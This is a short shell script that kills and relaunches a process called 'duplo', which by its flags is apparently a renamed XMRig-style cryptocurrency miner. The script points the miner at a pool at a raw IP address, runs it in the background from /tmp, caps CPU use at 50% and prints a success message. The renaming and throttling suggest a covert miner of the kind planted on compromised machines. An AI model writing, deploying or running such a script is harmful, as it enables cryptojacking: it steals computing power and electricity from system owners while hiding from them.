pkill duplo
sleep 7
duplo -o 185.251.39.97:55887 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server7/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=50 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/server7/duplo.log'
